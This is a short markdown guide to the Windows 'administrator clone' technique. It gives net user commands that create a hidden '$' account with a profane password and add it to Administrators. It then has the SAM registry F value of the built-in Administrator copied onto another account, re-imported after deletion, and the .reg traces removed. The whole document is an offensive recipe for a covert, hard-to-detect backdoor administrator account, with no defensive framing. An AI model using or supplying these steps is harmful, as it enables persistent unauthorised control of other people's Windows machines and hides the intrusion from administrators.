# Windows Administrator Clone

## Create account & Promote to Administrators group

```cmd
net user Cathryn$ fuckyoub1tch /add

net localgroup Administrators Cathryn$ /add
```

## Export Regedit info

HKEY_LOCAL_MACHINE\SAM\SAM

setup permission to FULL CONTROLL to Administrator

export HLM\SAM\SAM\Domains\Account\Users\000001f4

export HLM\SAM\SAM\Domains\Account\Users\000003e9 (Your Account Mapping permission)

export HLM\SAM\SAM\Domains\Account\Names\Cathryn$

## Edit

Open 1f4 & 3e9 via Notepad

Copy `F` Content to 3e9 from 1f4

save

# Delete User & import regedit files

```cmd
net user Cathryn$ /del
```

Merge Cathryn$.reg & 3e9.reg

setup permission to None to HLM\SAM\SAM

delete *.reg , close regedit.msc.